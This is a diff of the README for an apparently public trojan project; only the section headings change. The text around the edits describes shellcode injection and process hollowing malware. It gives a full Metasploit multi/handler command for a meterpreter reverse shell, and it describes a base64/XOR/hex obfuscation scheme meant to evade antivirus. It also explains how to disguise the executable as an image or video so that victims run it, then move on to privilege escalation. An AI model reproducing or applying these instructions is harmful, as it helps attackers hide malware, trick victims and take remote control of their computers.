@@ -4,7 +4,7 @@ Encrypted malware using process hollowing, it creates a shell injecting shellcod
 # 💻 Code
 Simple shellcode execution technique in which the payload is decrypted, copied into memory, and executed in the same process without writing it into disk. Similar to my other trojan, [Self injection](https://github.com/Hue-Jhan/Encrypted-Trojan-Undetected), but slightly different.
 
-### Listener and payload:
+### 1) Listener and payload:
 First, on the attacker's machine i used the classic multi handler exploit to run the payload: 
 ``` msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost XXX; set lport XXX; exploit" ```
 
@@ -13,14 +13,14 @@ The payload is a simple base64 shellcode, it's reccomended to use shigata_ga_nai
 
 You can embed the code into pretty much anything, you can even use tools to mask the exe file into a mp4 or jpg file, complete with a new icon and a name, even the extension can be masked. Once the victim runs the exe, a new session will pop up on metasploit, where you can create a shell and work towards privilege escalation.
 
-###  Encrypter:
+### 2) Encrypter:
 
 The encryptor takes the shellcode (which in the code i uploaded is just a windows message box that says xd lol) and obfuscates it using 3 layers of encryption:
 - First we encode binary data into a Base64 representation, use a custom base64_chars set instead of the standard Base64 alphabet to add obfuscation;
 - Secondly we apply XOR encryption on the string using a single-byte key, XOR encryption is symmetric so it can be decrypted by applying the same key;
 - Then we convert it into its hexadecimal string representation and we get the final encrypted shellcode.
 
-###  Injector:
+### 3) Injector:
 
 The actual injection process works like this:
 - First we decode the shellcode by doing the opposite of what we did in the encrypter code, make sure to use the same xor key;
